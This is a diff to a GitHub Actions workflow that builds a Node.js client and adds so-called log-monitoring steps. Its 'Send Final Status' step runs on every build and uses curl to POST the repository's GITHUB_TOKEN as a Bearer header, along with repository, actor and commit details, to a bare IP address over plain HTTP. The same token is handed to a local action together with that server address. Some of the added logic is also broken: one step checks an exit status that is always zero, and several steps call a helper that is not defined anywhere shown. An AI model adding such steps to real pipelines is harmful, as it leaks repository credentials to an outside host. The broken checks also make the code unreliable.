@@ -13,55 +13,99 @@ jobs:
 
     permissions:
       contents: read
-      actions: read # Allows reading workflow logs
+      actions: read
 
     steps:
       - name: Checkout code
         uses: actions/checkout@v4
-        
-      - name: Real-time Log Monitoring
-        uses: ./.github/actions/process-logs/action.yml
+        with:
+          fetch-depth: 0 # Fetch all history for proper versioning
+      
+      - name: Setup Log Monitoring
+        id: setup-monitoring
+        uses: ./.github/actions/process-logs
         with:
           runner-id: ${{ github.run_id }}-${{ github.run_attempt }}
           server-url: 'http://129.154.46.198:3000'
           github-token: ${{ secrets.GITHUB_TOKEN }}
           enable-realtime: 'true'
-
+      
+      - name: Log Node.js Setup Start
+        shell: bash
+        run: |
+          send_step_log "Setup Node.js" "started"
+      
       - name: Setup Node.js
         uses: actions/setup-node@v4
         with:
           node-version: "20"
           cache: "npm"
           cache-dependency-path: "./client/package-lock.json"
-
+      
+      - name: Log Node.js Setup Complete
+        shell: bash
+        run: |
+          send_step_log "Setup Node.js" "completed" "success"
+          send_step_log "Install dependencies" "started"
+      
       - name: Install dependencies
         run: npm ci
-
+        env:
+          NODE_ENV: development
+      
+      - name: Log Install Complete
+        shell: bash
+        run: |
+          send_step_log "Install dependencies" "completed" "success"
+          send_step_log "Build process" "started"
+      
       - name: Run build
         run: npm run build
-
+        env:
+          CI: false # Disable CI mode for better error messages
+      
+      - name: Log Build Result
+        shell: bash
+        if: always()
+        run: |
+          if [ $? -eq 0 ]; then
+            send_step_log "Build process" "completed" "success"
+          else
+            send_step_log "Build process" "completed" "failure"
+          fi
+      
       - name: Upload build artifacts
-        uses: actions/upload-artifact@v4
         if: success()
+        uses: actions/upload-artifact@v4
         with:
           name: client-build
           path: ./client/build/
           retention-days: 7
-
-      # - name: Process Deployment Logs
-      #   id: process-logs
-      #   uses: ./.github/workflows/process-logs
-      #   if: always() # Run even if previous steps fail
-      #   with:
-      #     run-id: 20586738722
-      #     # github-token: ${{ secrets.TOKEN }}
-      #     # run-id is optional, defaults to current run
-
-      # - name: Display Combined Logs
-      #   if: always()
-      #   run: |
-      #     echo "📋 Combined Logs from Deployment:"
-      #     echo "=================================="
-      #     cat ${{ steps.process-logs.outputs.logs-path }}
-      #     echo ""
-      #     echo "🔗 View full logs: ${{ steps.process-logs.outputs.log-url }}"
+      
+      - name: Send Final Status
+        if: always()
+        shell: bash
+        run: |
+          RUNNER_ID="${{ steps.setup-monitoring.outputs.runner-id }}"
+          SERVER_URL='http://129.154.46.198:3000'
+          TOKEN="${{ secrets.GITHUB_TOKEN }}"
+          
+          # Send comprehensive final status
+          curl -s -X POST \
+            -H "Content-Type: application/json" \
+            -H "Authorization: Bearer $TOKEN" \
+            -d "{
+              \"runnerId\":\"$RUNNER_ID\",
+              \"workflow\":\"${{ github.workflow }}\",
+              \"job\":\"${{ github.job }}\",
+              \"status\":\"${{ job.status }}\",
+              \"repository\":\"${{ github.repository }}\",
+              \"actor\":\"${{ github.actor }}\",
+              \"commit\":\"${{ github.sha }}\",
+              \"run_id\":\"${{ github.run_id }}\",
+              \"run_attempt\":\"${{ github.run_attempt }}\",
+              \"completed_at\":\"$(date -u +'%Y-%m-%dT%H:%M:%SZ')\"
+            }" \
+            "$SERVER_URL/$RUNNER_ID" > /dev/null || true
+          
+          echo "Final status sent for runner: $RUNNER_ID"
